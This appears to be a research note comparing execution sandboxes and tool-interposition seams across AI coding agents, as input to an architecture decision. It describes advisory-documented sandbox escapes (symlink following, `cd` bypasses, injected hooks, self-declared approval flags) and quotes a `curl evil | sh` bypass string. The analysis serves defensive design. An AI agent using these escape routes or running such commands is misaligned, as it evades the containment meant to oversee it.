# Execution seams in coding agents — prior art for the builtin-exec ADR

- **Status:** RESEARCH NOTE. No code, no ADR, no OpenSpec change. Input to the ADR that
  `docs/references/builtin-exec-seam-2026-09-22.md` says comes next.
- **Date:** 2026-09-22
- **Family surveyed:** Claude Code / Claude Agent SDK, OpenAI Codex CLI, opencode, Goose,
  Cline, Continue, Aider, Cursor, Windsurf/Cascade, Devin.
- **Method:** vendor docs, published type declarations, source read at file:line where the
  project is open source, GitHub Security Advisories, CVE records, third-party security
  research. Closed-source products (Cursor, Windsurf, Devin) are reported from documentation
  and advisories only, and that is said each time rather than inferred around.
- **Provenance caveat:** advisory IDs and line numbers below were gathered by three parallel
  research passes and are cited so a reviewer can check them. Anything load-bearing in the
  ADR should be re-opened at its URL before it is quoted in a decision.

---

## 0. The one-paragraph answer

**Nobody in this family ships a complete execution seam, and the two most mature vendors have
taken opposite positions on the exact question we are deciding.** Claude Code sandboxes the
shell and documents, in one sentence, that its file tools do not go through that sandbox —
and that half-seam produced a High-severity CVE with precisely the mechanism the design doc
predicted (contained shell plants a symlink, uncontained file tool follows it out). Codex CLI
did the opposite: `ExecBackend` and `ExecutorFileSystem` are peer traits, each with
local / sandboxed / remote implementations, and the sandbox context is a **parameter of every
file operation** rather than an ambient property of the process. Cline ships a per-tool
executor injection that is closest of all to our proposed shape — and leaves it undocumented
while pointing users at a weaker hook layer. Everyone else has no seam, a mutation-only hook,
or a container that structurally cannot reach the coding tools.

**Nothing found contradicts the agreed design.** Two things sharpen it (§8), and two of our
claims are unclaimed ground that no one in the family has solved (§9).

---

## 1. Claude Code / Claude Agent SDK

**1. Seam?** Three interposition points, all *decision* points, none an execution point.
- `canUseTool(toolName, input, {signal, suggestions, blockedPath, mcp_server}) =>
  Promise<PermissionResult>` (`@anthropic-ai/claude-agent-sdk` `sdk.d.ts:213`, `:1517`).
  `PermissionResult` is `{behavior:'allow', updatedInput?}` or `{behavior:'deny', message}`.
  It can allow, deny, or **rewrite the input** — it cannot supply the result. It is not
  called for anything auto-approved by `allowedTools` / allow rules / `permissionMode`, so it
  is not a reliable chokepoint.
- `PreToolUse` hook (`sdk.d.ts:2639`) — same shape, same limit.
- **`toolAliases`** (`sdk.d.ts:1534-1557`) — the closest published thing to our design, and it
  is our design, shipped: *"a host that runs Bash inside a remote sandbox via an MCP tool can
  set `{ Bash: 'mcp__workspace__bash' }`"*. **But their own docs name the leak:** the alias
  *"only affects name-based lookup of model-emitted `tool_use` blocks, whereas `disallowedTools`
  also blocks harness-internal direct calls that hold the tool object without a name lookup."*
  A seam that a subset of your own code routes around is a half-seam by a different door.

There is no `execute(toolCall) -> result` interface. Built-in tool bodies live inside the
compiled `claude` binary; the SDK spawns it as a subprocess. A host reroutes by *name*, or not
at all.

**2. Unit.** The whole tool call — name + JSON input. `BashInput` carries `command: string`
plus `dangerouslyDisableSandbox?: boolean` (`sdk-tools.d.ts:818-820`): the sandbox decision is
itself a rewritable field on the tool input.

**3. File tools vs shell — THE citation for this ADR.** From
<https://code.claude.com/docs/en/sandboxing>, section "Scope", verbatim:

> **The sandbox isolates Bash subprocesses. Other tools operate under different boundaries:**
> * **Built-in file tools**: Read, Edit, and Write use the permission system directly rather
>   than running through the sandbox.
> * **Environment variables**: sandboxed Bash commands inherit the parent process environment
>   by default, including any credentials set there.

Reinforced in the settings schema (`sdk.d.ts:8272`): `strictAllowlist` is *"Enforced for
sandboxed commands only — in-process tools such as WebFetch are not gated by this setting."*
Mitigation exists but is bolt-on: `sandbox.filesystem.allowWrite/denyWrite/denyRead` are
*"Merged with paths from `Edit(...)` / `Read(...)` allow/deny permission rules"*
(`sdk.d.ts:8304-8312`) — two enforcement engines kept in sync by merging path lists, which is
exactly the drift surface.

**4. Ordering and truncation — the library decides, and the order is NOT deterministic.**
Glob's shipped tool description: *"Returns matching file paths **sorted by modification
time**."* `GlobOutput` (`sdk-tools.d.ts:3469`) carries `truncated` (*"limited to 100 files"*),
`totalMatches`, and `countIsComplete` — *"whether totalMatches is the exact total (true) or a
**floor** because the underlying search truncated its own output."* mtime differs per machine
and per checkout, so **a capped Glob listing is not reproducible across two hosts holding
identical trees.** Grep (`sdk-tools.d.ts:894`) has `head_limit` (default 250) + `offset` over
ripgrep's output order; truncation is at least *disclosed* (`appliedLimit`, `appliedOffset`,
`totalFiles`), but no stable total order precedes the cap.

**5. Failure taxonomy — distinguished, and it drives a retry.** Sandbox violations are reported
in the blocked command's result *"naming the path or host the sandbox denied"*, and Claude may
retry with `dangerouslyDisableSandbox`. `decision_reason_type` (`sdk.d.ts:4508`) enumerates
`'rule' | 'mode' | 'subcommandResults' | 'permissionPromptTool' | 'hook' | 'asyncAgent' |
'sandboxOverride' | 'workingDir' | 'safetyCheck' | 'classifier' | 'other'`.
**Wrong default worth citing:** `sandbox.failIfUnavailable` defaults **`false`** — *"if the
sandbox cannot start … Claude Code shows a warning and runs commands without sandboxing."*
Fail-open on seam-unavailable.

**6. Default isolation — off by default, opt-in per project.** macOS Seatbelt; Linux/WSL2
bubblewrap + socat with an optional seccomp filter; **native Windows unsupported.** Explicit
non-protections, verbatim: TLS is not terminated so *"code running inside the sandbox can
potentially use domain fronting … to reach hosts outside the allowlist"*; `allowUnixSockets`
with `/var/run/docker.sock` *"effectively grants access to the host system"*;
`enableWeakerNestedSandbox` *"considerably weakens security"*; `allowAppleEvents` *"removes
code-execution isolation"*; a developer's `!`-prefixed shell commands run outside the sandbox
entirely. And the framing line: *"Sandboxing reduces risk but is not a complete isolation
boundary."*

**7. Defects.**

| Advisory | Bug | Fixed |
|---|---|---|
| CVE-2026-39861 / GHSA-vp62-r36r-9xqp (High 7.7) | **Sandbox escape via symlink following.** Sandboxed Bash creates a symlink out of the workspace; the **unsandboxed file tool** writes through it, no prompt. *"Neither component could independently write outside the sandbox, but their combination could."* | 2.1.64 |
| CVE-2026-25722 / GHSA-66q4-vfjg-2qhh (High 7.7) | **`cd` into `.claude` bypassed write protection** — path-prefix checks defeated by changing directory. | 2.0.57 |
| CVE-2026-25725 | bubblewrap didn't protect `.claude/settings.json` **when it didn't exist at startup**; sandboxed code creates it, injects a `SessionStart` hook, which runs with host privileges. | 2.1.2 |
| GHSA-7835-87q9-rgvv | Sandbox escape via **git worktree path confusion**. | Jun 2026 |
| GHSA-4vp2-6q8c-pvq2 | `/copy` insecure temp file → symlink-based file write. | Jun 2026 |

Pattern: **every file-write escape exploited either the gap between the OS-enforced shell
boundary and the library-enforced file-tool boundary, or a path-string check that a symlink,
a `cd`, or a worktree defeated.** Our design doc's `cd` anecdote is the same defect class as
CVE-2026-25722, found independently.

---

## 2. OpenAI Codex CLI

The strongest prior art in the survey, and the one that **validates the full-seam position**.

**1. Seam?** Two peer traits, crate-internal (`openai/codex` @ `142360dac8ea`, 2026-09-21):

```rust
// codex-rs/exec-server/src/process.rs:199,223
pub trait ExecProcess  { fn read(..); fn write(..); fn signal(..); fn terminate(..); … }
pub trait ExecBackend  { fn start(&self, params: ExecParams) -> ExecBackendFuture<'_>;
                         fn start_with_network_policy_decider(…); … }
```

Implementations `local_process.rs` (`LocalProcess`) and `remote_process.rs` (`RemoteProcess`):
the same agent loop drives a local sandboxed process or a process on a **remote exec-server**.
`EnvironmentManager` (`exec-server/src/environment.rs:73`) *"owns the execution/filesystem
environments available to the Codex runtime"*, selected via `CODEX_EXEC_SERVER_URL`.
**Blunt caveat: there is no documented public extension point.** These are internal traits; a
host interposes by standing up an exec-server, not by implementing a stable API.

**2. Unit — two units, deliberately different.** Shell: an `ExecParams` carrying a **shell
command string** (`core/src/tools/handlers/shell_spec.rs:36-80` — `cmd`, `workdir`, `tty`,
`shell`, `login`, `yield_time_ms`, `max_output_tokens`, and an optional **`environment_id`**,
i.e. the choice of execution environment is surfaced into the model-facing tool schema).
Files: **structured operations** on `PathUri`.

**3. File tools — a full seam, not a half one.** `codex-rs/file-system/src/lib.rs:627`:

```rust
pub trait ExecutorFileSystem: Send + Sync {
    fn read_file(&self, path, options, sandbox: Option<&FileSystemSandboxContext>) -> …;
    fn write_file(&self, path, contents, options, sandbox) -> …;
    fn read_directory(&self, path, sandbox) -> …<Vec<ReadDirectoryEntry>>;
    fn walk(&self, path, options: WalkOptions, sandbox) -> …<WalkOutcome>;
    fn canonicalize / create_directory / get_metadata / remove / copy …
}
```

**Every method takes an explicit `sandbox` parameter** — the sandbox context is an argument of
the operation, not an ambient property of the process. Implementations mirror the process side:
`local_file_system.rs`, `remote_file_system.rs`, `sandboxed_file_system.rs`, plus
`sandboxed_file_open.rs` / `no_follow/` for symlink-safe opens. `apply_patch` is the consumer
(`core/src/tools/handlers/apply_patch.rs:503` takes `fs: &dyn ExecutorFileSystem`).

Qualification worth stating in the ADR: **Codex has no `grep`/`glob`/`read` model tool.** The
model runs `rg`/`cat` through the shell, so search is under the process sandbox. The only file
tool it exposes to the model is `apply_patch` — the one it put behind a seam.

**4. Ordering and truncation — deterministic by construction. This is our rule, implemented.**
`file-system/src/lib.rs:131-176` defines `WalkOptions{max_depth, max_directories, max_entries,
follow_directory_symlinks, prune_hidden_directories}` and `WalkOutcome{entries, errors,
truncated}`. `exec-server/src/local_file_system.rs:780-805` does BFS with a `VecDeque`, calls
**`entries.sort();` before iterating**, then:

```rust
if entry_count == options.max_entries { outcome.truncated = true; return Ok(outcome); }
```

**Lexical sort → cap → flag**, with errors carried as data (`WalkError`) instead of aborting,
and a `visited_directories` identity set to break symlink cycles. This is the single strongest
endorsement of our collect→sort→truncate rule. Claude Code's mtime ordering is the
counterexample on the same page.

**5. Failure taxonomy — split brain, and their own comment is the argument for a typed channel.**
The new path is structured: `ExecProcessEvent::Exited { seq, exit_code, sandbox_denied:
Option<bool> }` — "denied" is a **separate field** from the exit code. The old path is a
keyword sniff, `codex-rs/sandboxing/src/denial.rs:1-70`, verbatim:

> *"We don't have a fully deterministic way to tell if our command failed because of the
> sandbox … For now, we conservatively check for well known command failure exit codes and
> also look for common sandbox denial keywords in the command output."*

```rust
const QUICK_REJECT_EXIT_CODES: [i32; 3] = [2, 126, 127];
const SANDBOX_DENIED_KEYWORDS: [&str; 7] = ["operation not permitted","permission denied",
    "read-only file system","seccomp","sandbox","landlock","failed to write file"];
```

It lowercases and substring-matches the child's stdout/stderr. A program that prints the word
"sandbox" is classified as sandbox-denied. **Cite this as the concrete cost of not making
"could not run" a distinct return channel: the most serious Rust implementation in the family
ended up grepping its own child's stderr for the word "sandbox".**

**6. Default isolation — on by default, mode chosen by whether the folder is a git repo.**
Version-controlled → `Auto` (workspace-write + on-request approvals); non-version-controlled →
read-only. macOS `sandbox-exec` with in-tree seatbelt profiles; Linux `bwrap` + seccomp +
landlock. **Network off by default.** Inside writable roots, `.git`, `.agents` and `.codex`
stay read-only — `WritableRoot{root, read_only_subpaths, protected_metadata_names}`
(`protocol/src/protocol.rs:1122-1175`), whose doc comment names the reason: *"folders
containing files that could be modified to escalate the privileges of the agent (e.g.
`.codex`, `.git`, notably `.git/hooks`)"*. Explicit non-protection: the network proxy does not
filter web search, connector tool calls, MCP connections, browser/Computer Use, cloud tasks,
or the client's own model requests.

**7. Defects.**

| Advisory | Bug | Fixed |
|---|---|---|
| GHSA-w5fx-fh39-j5rw (High 8.6) | **Model-supplied working directory was accepted as the sandbox writable root** — the seam's *policy input* came from the untrusted side. Fix canonicalizes and uses the boundary from where the user started the session. | 0.39.0 |
| "Overpatch" (Accomplish) | **`apply_patch` granted write access to the parent directory of each path in the patch.** A patch entry referencing `/tmp` widened the grant to `/`; a second entry appended to `.zshrc` through a symlink. | 0.149.0 |
| "Heapjack" | Node REPL trust token in a V8 heap shared with untrusted contexts; `v8.getHeapSnapshot()` stole it → unsandboxed execution **from read-only mode, no prompt**. | Desktop 26.818.21641 |
| GHSA-v4xv-rqh3-w9mc "GitPwned" (8.6) | **`git show` on the default safe-command allowlist**, and allowlisted commands *"bypass the sandbox, skip user approval"* → RCE. | 0.95.0 |

---

## 3. opencode

*Repo note: the redirect runs `sst/opencode` → **`anomalyco/opencode`**, default branch `dev`.
v1 (`packages/opencode/src/tool/*`, tag `v1.18.31`) is what the docs describe; v2
(`packages/core/src/tool/*`, Effect-based) is what ships, and v2 has **fewer** seams.*

**1. Seam? None.** `packages/plugin/src/index.ts:266-281` (@ v1.18.31):

```ts
"tool.execute.before"?: (input:{tool;sessionID;callID}, output:{args:any}) => Promise<void>
"tool.execute.after"?:  (input:{…;args}, output:{title;output;metadata}) => Promise<void>
"permission.ask"?:      (input:Permission, output:{status:"ask"|"deny"|"allow"}) => Promise<void>
```

All `Promise<void>` — **a hook cannot return a result.** `session/tools.ts:102-130` proves it
is around-not-instead: `trigger("tool.execute.before")` then `const result = yield*
item.execute(args, ctx)`, unconditional. Only a throw stops it (deny, not redirect). Exec is
hard-wired (`core/src/tool/bash.ts:158-171` → `ChildProcess.make`). The bash tool's own
description: *"Execute one shell command string with the host user's filesystem, process, and
network authority."*

**v2 is a regression:** `packages/plugin/src/v2/` has no `tool.ts`; v2 plugins cannot register
tools or hook execution. `bash.ts:70` carries `// TODO: Add plugin shell.env environment
augmentation once V2 plugin hooks exist.` The planned future shape is still mutation-only.

**2. Unit.** Whole tool call. For bash that is `{command: string, …}` — an **unparsed shell
string**, i.e. a host interposing must re-implement shell parsing, which opencode itself gave
up on twice.

**3. Half seam — three separate execution paths.** bash → `ChildProcess.make` with a shell;
`glob`/`grep` → a **second, separate** spawn of the bundled `rg` (`core/src/ripgrep.ts:110`
from `tool/glob.ts:76`, `tool/grep.ts:97`) that never touches bash's permission/workdir logic;
`read`/`write`/`edit`/`apply-patch`/list → in-process Node `fs`. Filed twice as a bug:
[#38664](https://github.com/anomalyco/opencode/issues/38664) (*shell tool bypasses edit/write
permission checks*) and
[#42979](https://github.com/anomalyco/opencode/issues/42979) (*`external_directory: deny`
blocks write/edit/read but `echo BYPASS > /tmp/…` succeeds — "enforcement depends on which
command name is typed"*). The community answer was Docker, not a seam.

**4. Ordering/truncation — truncate-before-sort, and the flag is dropped.** v2 glob passes
`limit: input.limit ?? Number.MAX_SAFE_INTEGER` (no default, `filesystem.ts:37`);
`ripgrep.ts:117-131` does `Stream.take(limit+1)` — truncation **at the stream head in
`rg --files` order** — and `glob.ts` maps `result.items` and **discards `truncated` entirely.**
v1 at least capped at 100 with a truncation notice. Filed as
[#31767](https://github.com/anomalyco/opencode/issues/31767) (closed); the
`MAX_SAFE_INTEGER` default is still on `dev`.
**The one good path is the non-ripgrep one**, `read-filesystem.ts:346-351`: filter → sort
(dirs first, `localeCompare`) → `slice` → explicit `truncated` + `next` cursor. Note it is the
only listing path that does **not** go through a spawned binary — which is exactly our point
about where the ordering decision has to live.

**5. Failure taxonomy — collapsed.** Non-zero exit is a *success* carrying `{exit, truncated,
timeout}`. "Could not run" is flattened by a catch-all (`bash.ts:196`):
`Effect.mapError(() => new ToolFailure({message: \`Unable to execute command: ${input.command}\`}))`
— ENOENT, EPERM, bad cwd, spawner failure, one string, cause discarded. Rich tagged errors
exist internally and are erased at the tool boundary (`registry.ts:69-71`).

**6. Default isolation: nothing.** No seatbelt, landlock, seccomp, namespace or container
anywhere; "sandbox" in opencode's vocabulary means a git worktree. Offered and declined three
times — [#19472](https://github.com/anomalyco/opencode/pull/19472),
[#21538](https://github.com/anomalyco/opencode/pull/21538) (macOS `sandbox-exec`),
[#22961](https://github.com/anomalyco/opencode/pull/22961) (*"Opt-in substrate that runs every
tool's fs + subprocess calls inside a per-tenant Vercel sandbox instead of on the host"* — our
design, verbatim) — all closed, `merged_at: null`. Third-party wrappers are bash-only and
**fail open** (*"if anything goes wrong… commands run normally without sandbox"*).

**7. Defects.** Two advisories are about the HTTP server in front of the tools, not the tools:
CVE-2026-22812 / GHSA-vxw4-wv6m-9hhh (unauthenticated HTTP server → arbitrary command
execution) and CVE-2026-22813 / GHSA-c83v-7274-4vgp (critical; XSS on localhost:4096 → RCE via
`/pty/`). *Lesson: expose the seam over HTTP and the seam's auth becomes the vulnerability.*
Seam-relevant classes:
- **Symlink escape, containment was lexical** —
  [#40160](https://github.com/anomalyco/opencode/issues/40160) /
  [#43346](https://github.com/anomalyco/opencode/issues/43346): the check compared paths
  lexically and never resolved symlinks, and *the approval prompt showed the path relative to
  the worktree* — it actively lied about which file was opened. Fixed with `realPath` first.
  **glob and grep still bypass `LocationMutation.resolve` entirely** (bare `path.resolve` at
  `glob.ts:75`, `grep.ts:95`).
- **Shell as universal permission bypass** —
  [#49948](https://github.com/anomalyco/opencode/issues/49948) (open): a command the scanner
  parses to *zero* commands (`> victim.txt`) skips the permission check entirely.
- **The hook itself is unreliable** —
  [#42409](https://github.com/anomalyco/opencode/issues/42409) (open): mutating
  `output.args.command` in `tool.execute.before` is visible to later hooks **but the original
  command still executes**. Every sandbox plugin depends on exactly that. Converse:
  [#35882](https://github.com/anomalyco/opencode/issues/35882) — permissions are evaluated
  *after* plugin mutation, so an allowlist can be satisfied by a rewritten string.

---

## 4. Goose

**1. Seam — yes, well shaped, barely used.** The coding tools moved out of MCP subprocesses
into an in-process "platform extension" that still implements the MCP client trait
(`crates/goose/src/agents/platform_extensions/developer/mod.rs:189-262`):

```rust
#[async_trait] impl McpClientTrait for DeveloperClient {
  async fn call_tool(&self, ctx:&ToolCallContext, name:&str,
                     arguments:Option<JsonObject>, cancel:CancellationToken)
      -> Result<CallToolResult, Error>
}
```

Interposition: `extension_manager/mod.rs:598-610` `add_client(name, config, client, info)`.
**One shipped consumer** — ACP/Zed (`acp/server.rs:1080-1139`) wraps `DeveloperClient` in an
`AcpTools` decorator. Guard at `server.rs:1085-1097`: if the client advertises no fs/terminal
capability, the override is **silently skipped and exec falls back to the host**.

**2. Unit.** Whole MCP tool call; the decorator must re-parse args per tool and know every
schema. Shell arrives as an opaque single string, so any sandbox on the far side must itself
run a shell.

**3. Half seam — confirmed and shipped.** `acp/fs.rs:412-443` intercepts by name with a
fall-through:

```rust
match name { "read" if self.fs_read => …, "write" if self.fs_write => …,
             "edit" if …, "shell" if self.terminal => …,
             _ => self.inner.call_tool(...).await }   // tree, read_image → HOST
```

An ACP host that has taken over read/write/edit/shell still has Goose walking the **host**
filesystem for `tree` and doing **network** for `read_image`. Worse, `read` isn't in the base
toolset (`mod.rs:279` = `["write","edit","shell","tree","read_image"]`) — `AcpTools::list_tools`
*injects* it. **The intercepted surface and the native surface are not the same surface.**
Underneath, file tools are direct `std::fs`, and `resolve_path` (`edit.rs:214-225`) does **no
confinement at all** — absolute paths returned as-is, no canonicalize, no `..` check, no
symlink check.

**4. Ordering/truncation — there is no glob and no grep tool.** System instructions
(`mod.rs:66-68`) tell the model *"When you need to search, prefer `rg`… Then use `cat` or
`sed`."* So search semantics are ripgrep inside `shell`, and a structured-file-op seam never
sees a search. `tree` is **sorted (BTreeMap, dirs-then-files, `tree.rs:87-92,127-148`) and
uncapped** — no truncation message; `depth: 0` dumps a whole repo into context. Shell output:
2000 lines / 50 KB, preview = **last 50 lines** (errors live at the end), full output written
to a rotating temp file with the notice in a **separate content block** so the model reads it
as instruction, not data (`shell.rs:852-867`). That last detail is worth stealing.

**5. Failure taxonomy — distinguishable in the payload, collapsed in the boolean, and LOST at
the seam.** `ShellOutput{stdout, stderr, exit_code: Option<i32>, timed_out, output_truncated,
output_collection_error}` separates spawn failure from non-zero exit — then
`is_error = timed_out || exit_code.unwrap_or(1) != 0 || output_collection_error.is_some()`
buckets them, and `exit_code: None` is overloaded (killed *or* never started). **The ACP path
loses even that**: `acp_shell` (`acp/fs.rs:302-317`) rebuilds from exit status only, with
`exit_status: None` silently becoming `0` via `unwrap_or_default()`. **This is the
seam-parity bug to name in the ADR: the interposed implementation is not required to reproduce
the native one's failure taxonomy, and no test or type enforces it.**

**6. Default isolation: none.** Zero hits for landlock / seatbelt / sandbox-exec / bubblewrap /
firejail in `crates`. And the container support **structurally cannot reach the coding tools**:
`goose session --container <ID>` becomes `docker exec -i` for stdio and builtin extensions,
but the match at `extension_manager/mod.rs:541-565` routes `developer` through the
`Platform`/`PLATFORM_EXTENSIONS` arm **first**, dropping the `container` argument. The docs
never say this. **Goose has a container seam and a coding-tool seam, and they do not meet.**
Default mode is `Auto` = unconditional allow; `SmartApprove` auto-allows on `read_only_hint:
true` — a **self-declared** annotation. Docs are honest: *"goose can run system commands with
your user privileges and edit any accessible file without your approval."*

**7. Defects.** CVE-2026-72718 / GHSA-r5pp-p5r8-466r (High, patched 1.44.0): `goose review`
stripped `core.quotePath` from attacker-controlled git config but **not `core.fsmonitor`**, so
`git diff HEAD` ran the attacker's command on opening a malicious repo — **before any LLM call
or approval prompt.** It bypassed the whole permission model because it was not a tool call.
*Generalizable: a seam only helps if every exec goes through it.*
One more, directly relevant to kind-2 reporting: **`cmd.exe` silently truncated multi-line
commands and returned exit 0** — the tool reported success for something that never ran in
full (now rejected up front, `shell.rs:393-400`). A zero exit code is not evidence that the
command executed was the command sent.

---

## 5. Cline

The closest published prior art to our proposed shape — and it is undocumented.

**1. Seam — a real per-tool executor injection.**
`sdk/packages/core/src/extensions/tools/types.ts`:

```ts
export type ShellExecutor      = (command: string | StructuredCommandInput, cwd: string, ctx) => Promise<string>;
export type FileReadExecutor   = (request: ReadFileRequest, ctx) => Promise<FileReadResultContent>;
export type SearchExecutor     = (query: string, cwd: string, ctx) => Promise<string>;
export type EditorExecutor     = (input: EditFileInput, cwd: string, ctx) => Promise<string>;
export type ApplyPatchExecutor = (input: ApplyPatchInput, cwd: string, ctx) => Promise<string>;

export interface ToolExecutors { readFile?; search?; bash?; webFetch?; editor?; applyPatch?; skills?; askQuestion?; submit? }
export interface CreateDefaultToolsOptions extends DefaultToolsConfig { executors: ToolExecutors }
```

Load-bearing, not aspirational: `apps/vscode/src/sdk/vscode-session-host.ts:121-142` builds a
`Partial<ToolExecutors>` and swaps in a VS Code file-read executor, a run-commands executor, a
diff-view `editorExecutor` (*"Fully replaces the SDK's default disk-writing executor"*), and an
`applyPatchExecutor` — and sets `bash = undefined` to disable it.
**But `docs/sdk/tools.mdx` never mentions `executor`, `sandbox`, `container` or `isolat`.**
What *is* documented (`docs/sdk/plugins.mdx`) is the weaker `beforeTool`/`afterTool` layer —
*"Observe or audit tool calls before they execute"* — the same observe/deny shape as opencode.
**Cline ships the right seam and points users at the wrong one.**

**2. Unit — structured per-tool ops.** Typed args per executor. Shell accepts **both
spellings**: `string | StructuredCommandInput{command, args?}`, and `bash.ts:1100` decides by
*key presence*, not value: `const directExec = typeof command !== "string" && "args" in command`
— args present ⇒ spawn without a shell. Useful precedent if our seam wants argv and
command-string in one type.

**3. File tools — YES, same seam. The one full seam of the three JS/TS tools.** `readFile`,
`search`, `editor`, `applyPatch` and `bash` are all first-class `ToolExecutors` entries.
**Gap to flag: there is no `listFiles`/glob executor** — `apps/vscode/src/services/glob/
list-files.ts` is called directly with node `globby`, outside the seam. Half-seam risk survives
at exactly one tool, and it is the listing tool. *The gap is always the tool nobody thought of
as execution.*

**4. Ordering/truncation — no sort anywhere; cap in traversal order.**
`apps/vscode/src/services/glob/list-files.ts`:

```ts
const results: Set<string> = new Set()
while (queue.length > 0 && results.size < limit) { … if (results.size >= limit) break; results.add(file) … }
return Array.from(results).slice(0, limit)
return [filePaths, filePaths.length >= limit]
```

Insertion-ordered `Set`, BFS, **truncate-during-traversal, never sorted** — plus a 10s
`Promise.race` that returns partial results with only a `Logger.warn`, so **identical inputs on
a slow disk give different listings**. Search caps at 100 in rg stream order. The same file
carries a deliberate, commented decision *not* to disable symlink following (*"we could use
`followSymlinks: false` but that may not be ideal… it's pointless if they're not using symlinks
wrong"*) — an explicit choice to leave the symlink-loop/escape path open in the one tool that
has no executor slot. **Truncation policy is worth copying** (`executors/output-limits.ts`):
`MAX_COMMAND_OUTPUT_CHARS = 48_000`, `MAX_READ_LINES = 2_000`, `MAX_LINE_CHARS = 2_000`,
middle-elision with the notice **in the preserved head/tail** so a later re-truncation cannot
eat the recovery guidance, measured in UTF-16 units because *"every character returned by an
executor is re-sent to the model on each subsequent request, so oversized outputs cost
quadratically."*

**5. Failure taxonomy — the best in the family, by a typed error.** `bash.ts:320-327`:

```ts
export class CommandExitError extends Error {
  constructor(readonly exitCode: number, readonly output: string) { … }
}
```

vs the spawn path `child.on("error", …) => reject(new Error(\`Failed to execute command: …\`))`
(`bash.ts:1041-1051`), plus a `TimeoutError`. **"Could not run at all" and "ran and exited
non-zero" are distinct types.** Exactly our kind 1 / kind 2.

**6. Default isolation: none.** No sandbox-exec / landlock / seccomp / container. YOLO mode
*"disables all safety checks"*, and the mitigation offered is *"Start with isolated
environments"* — bring your own. The one enforcement mechanism disclaims itself in its own
header (`command-guard.ts`): *"This is a simple blacklist, not a shell interpreter… It will not
catch every possible mutation (e.g. `python -c \"open(..., 'w')\"` …)."*

**7. Defects.** CVE-2026-52024 / CVE-2026-52025 (Manifold Security). **52024 is the one that
matters here:** "Safe Commands" does not match a curated allowlist — it reads
`requires_approval: true|false`, **a parameter the LLM writes on its own tool call**, and
trusts it, even after the same agent has been manipulated by attacker content. Compare Goose's
`SmartApprove` trusting a self-declared `read_only_hint`. **Same defect class, two products.**
Cline shipped the fixes as "product hardening", not as an advisory, so a changelog reader would
never see them.

---

## 6. Continue

**1. Seam — best-shaped of the mid-tier.** `core/index.d.ts` defines an `IDE` interface
implemented by the VS Code extension, the JetBrains plugin and the CLI: `readFile`,
`readRangeInFile`, `writeFile`, `removeFile`, `fileExists`, `listDir`,
`getSearchResults(query, maxResults)`, `getFileResults(pattern, maxResults)`, `getFileStats`,
`subprocess(command, cwd)`, `runCommand(command, options)`. A genuine execution abstraction
with a real second implementation. Plus a three-level policy layer (`allow`/`ask`/`exclude`),
where `exclude` removes the tool before the model ever sees it.

**2. Unit.** Whole tool call at the policy layer; structured ops for files and a command string
for `runCommand`/`subprocess` at the `IDE` seam.

**3. File tools clean; the shell has a local fast-path AROUND the seam.** Every file tool routes
through `extras.ide.*` (`readFile.ts`, `readFileRange.ts`, `createNewFile.ts`, `globSearch.ts`,
`grepSearch.ts`, `lsTool.ts`). **But `runTerminalCommand.ts` imports `node:child_process`
directly** and spawns locally whenever `ideInfo.remoteName` is `""`/`"local"`; only remote
workspaces delegate to `ide.runCommand`, and that path returns *"Command executed in remote
terminal. Output capture is not yet available for remote environments."* **On the default local
setup the shell bypasses the seam entirely, and the one time it honours it, it goes blind.**
Two more asymmetries inside the file tools: `readFile`/`readFileRange`/`createNewFile` call
`throwIfFileIsSecurityConcern` (blocks `*.env`, `*.pem`, `.aws/`, `secrets/`…) while
**`grepSearch`, `globSearch` and `lsTool` do not** — and `lsTool` passes
`overrideDefaultIgnores: ignore()` to show everything. And the source carries the admission
verbatim, in Plan mode's policy set (`extensions/cli/src/permissions/defaultPolicies.ts`):

```ts
// TODO address bash read only concerns, maybe make permissions more granular
{ tool: "Bash", permission: "allow" },   // while Edit/MultiEdit/Write are "exclude"
```

A read-only mode whose shell is wide open — the half-seam, admitted in a TODO.

**4. Ordering/truncation — library-side caps, arrival order, no determinism.**
`MAX_AGENT_GLOB_RESULTS = 100`, `DEFAULT_GREP_SEARCH_RESULTS_LIMIT = 100`,
`DEFAULT_GREP_SEARCH_CHAR_LIMIT = 7500`, `MAX_LS_TOOL_LINES = 200` — all `.slice(0, N)` on
whatever the IDE returned, **no sort before truncate**, and the cap is passed *into* the IDE
(`getSearchResults(query, 100)`), **so the host picks which 100.** That is precisely the
delegation our design refuses. Good practice worth copying: each tool appends an explicit
`"Truncation warning"` context item naming *which* limit bit (count vs chars).

**5. Failure taxonomy — partial locally, lost at the seam.** Locally it distinguishes
`` `Command failed with exit code ${code}` `` from `` `Command failed with: ${error.message}` ``
— the right distinction, but only as **prose in a `status` string**, not a typed field. Across
the seam it collapses completely: `runCommand(command): Promise<void>` returns nothing — no
output, no exit code, no error class. `grepSearch` resorts to
`errorMessage.includes("Process exited with code 2")` to detect a bad regex.

**6. Default isolation: none.** `Read`/`List`/`Search`/`Fetch` → `allow`; `Edit`/`Write`/`Bash`
→ `ask`. **Headless flips it:** `{tool:"Bash", permission:"allow"}` plus
`{tool:"*", permission:"allow"}`.

**7. Defects.** **CVE-2026-8770** (≤1.2.22, CWE-22): `lsTool`'s `dirPath` not constrained to the
workspace root. The underlying report,
[#8877](https://github.com/continuedev/continue/issues/8877), is the cleanest half-seam
anecdote in the survey: with the ls policy on "Automatic", `dirPath: "/"` **correctly
prompted**; `dirPath: "."` and `"../../"` **did not**, and listed the filesystem root. The gate
string-matched the argument in the policy layer instead of being enforced at the execution
boundary, so it caught the spelling it recognised and missed the equivalent one. Separately,
`Bash(ls*)` patterns are raw glob→regex over the **entire command string**
(`permissionChecker.ts:24-47`), so `ls; curl evil | sh` matches `ls*` — which is why
`@continuedev/terminal-security` exists at all (it tokenises with `shell-quote`, walks
operators, recurses into `$(...)`, and forces "ask" on any variable expansion).

---

## 7. Aider, Cursor, Windsurf, Devin (abbreviated)

**Aider — no seam, and more extreme than assumed: there is no tool-calling architecture at
all.** `grep -rni sandbox aider/` → **zero hits**. Files enter context by a human typing
`/add`; the LLM emits SEARCH/REPLACE blocks parsed out of prose. There is no tool invocation to
intercept. Exec is a module-level import (`base_coder.py:48` → `:2475`), via
`pexpect.spawn(shell, args=["-i","-c", command])` (`run_cmd.py:116`) — an **interactive** shell
that loads the user's dotfiles. File I/O is bare `open()` (`io.py:458`/`:493`) with no root
check, no `..` guard, no symlink check, no confirmation. No grep tool at all. Failure taxonomy:
`OSError` → `return 1, msg` — "binary missing" is indistinguishable from "tests failed" — and
**the exit code is never shown to the LLM** (`prompts.py:36` has only `{command}`/`{output}`;
`exit_status` is assigned at `base_coder.py:2475-2477` and never read).
